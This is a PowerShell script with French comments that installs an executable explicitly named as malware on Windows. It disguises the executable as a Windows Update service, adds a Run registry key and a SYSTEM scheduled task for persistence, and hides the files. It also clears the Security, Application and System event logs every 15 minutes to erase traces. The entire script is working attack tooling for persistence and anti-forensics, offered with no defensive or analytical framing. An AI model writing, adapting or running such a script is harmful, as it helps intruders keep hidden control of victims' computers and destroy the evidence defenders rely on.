# Variables de configuration
$installPath = "C:\ProgramData\Malware"               # Chemin d'installation discret pour le malware
$malwareExe = "$installPath\rust_compile_malware.exe"              # Chemin de l'exécutable du malware
$logCleanupScriptPath = "$installPath\logs_cleanup.ps1" # Chemin du script de nettoyage des logs

# Création du dossier d'installation
if (!(Test-Path -Path $installPath)) {
    New-Item -ItemType Directory -Path $installPath | Out-Null
}

# Assurer l'existence de l'exécutable du malware
if (!(Test-Path -Path $malwareExe)) {
    Write-Output "Erreur : Le fichier rust_compile_malware.exe est introuvable dans $installPath."
    exit
}

# Création du script de nettoyage des logs
@"
wevtutil cl Security
wevtutil cl Application
wevtutil cl System
"@ | Out-File -FilePath $logCleanupScriptPath -Encoding UTF8

# 1. Création du service Windows pour exécuter le malware
$serviceName = "WindowsUpdateService"
$displayName = "Service Windows Update Manager"
$description = "Service de mise à jour automatique du système"
sc.exe create $serviceName binPath= $malwareExe DisplayName= $displayName start= auto
sc.exe description $serviceName $description
sc.exe start $serviceName

# 2. Ajout d'une entrée dans le registre pour exécuter le malware au démarrage
$registryPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
$valueName = "WindowsUpdateManager"
Set-ItemProperty -Path $registryPath -Name $valueName -Value $malwareExe

# 3. Création d'une tâche planifiée pour redondance de l'exécution du malware
$taskName = "WindowsUpdateChecker"
$action = New-ScheduledTaskAction -Execute $malwareExe
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName $taskName -Description "Vérification de mise à jour du système"

# 4. Création d'une tâche de nettoyage récurrent des logs
$cleanupTaskName = "LogCleanupTask"
$cleanupAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File `"$logCleanupScriptPath`""
$cleanupTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(15) -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration ([timespan]::MaxValue)
Register-ScheduledTask -Action $cleanupAction -Trigger $cleanupTrigger -Principal $principal -TaskName $cleanupTaskName -Description "Nettoyage récurrent des logs système"

# 5. Masquage des fichiers et dossiers
Get-Item $installPath | ForEach-Object { $_.Attributes = 'Hidden' }
Get-Item $malwareExe | ForEach-Object { $_.Attributes = 'Hidden, System' }
Get-Item $logCleanupScriptPath | ForEach-Object { $_.Attributes = 'Hidden, System' }

# 6. Exécution initiale du malware et du nettoyage des logs
Start-Process -FilePath $malwareExe -WindowStyle Hidden
Start-Process -FilePath "powershell.exe" -ArgumentList "-File `"$logCleanupScriptPath`"" -WindowStyle Hidden

Write-Output "Installation et configuration terminées avec succès."
